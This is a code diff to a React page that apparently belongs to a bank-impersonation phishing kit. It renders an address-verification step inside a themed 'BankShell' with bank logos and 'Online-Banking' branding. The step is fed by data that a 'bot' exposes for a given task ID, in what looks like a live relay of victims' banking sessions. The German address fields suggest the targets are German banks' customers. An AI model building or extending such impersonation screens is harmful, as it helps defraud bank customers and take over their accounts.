@@ -187,7 +187,58 @@ function PersonalDataPage() {
     [poolAddress, customer],
   );
 
+  // Address payload the bot exposes as soon as it hits waiting_for_address_confirm
+  const addressData = result?.address_data ?? result?.adress_data ?? null;
+  const addrFromPayload = addressData
+    ? {
+        current: {
+          strasse: firstString(addressData.old_street, addressData.current_street, addressData.strasse) || "",
+          plzOrt: [
+            firstString(addressData.old_plz, addressData.old_zip, addressData.current_plz, addressData.plz),
+            firstString(addressData.old_city, addressData.current_city, addressData.ort, addressData.city),
+          ].filter(Boolean).join(" "),
+        },
+        next: {
+          strasse: firstString(addressData.new_street, addressData.next_street) || "",
+          plzOrt: [
+            firstString(addressData.new_plz, addressData.new_zip),
+            firstString(addressData.new_city, addressData.next_city),
+          ].filter(Boolean).join(" "),
+        },
+      }
+    : null;
+
+  // Allow the address popup to render even before person_data arrived, using
+  // the address payload directly. Otherwise, wait for the initial data.
   if (!result || !customer) {
+    if (step === "address" && addrFromPayload?.current.strasse) {
+      const theme = bankCtx?.theme ?? DEFAULT_THEME;
+      const shellProps = {
+        theme,
+        logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
+        fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
+        bankName: bankCtx?.bankName ?? "Online-Banking",
+        showName: bankCtx?.showName ?? false,
+        bigLogo: bankCtx?.bigLogo ?? false,
+        footerLinks: (bankCtx?.footerLinks ?? null) as any,
+      };
+      return (
+        <BankShell {...shellProps}>
+          <AddressVerificationStep
+            theme={theme}
+            taskId={taskId}
+            currentAddress={addrFromPayload.current}
+            additionalAddress={addrFromPayload.next.strasse ? addrFromPayload.next : addrFromPayload.current}
+            {...(bankCtx?.group ? { bankGroup: bankCtx.group } : {})}
+            onBack={() => setStep("personal")}
+            onDeleted={(deleted) => {
+              setDeletedAddr(deleted);
+              setStep("deleted");
+            }}
+          />
+        </BankShell>
+      );
+    }
     return (
       <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
         <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
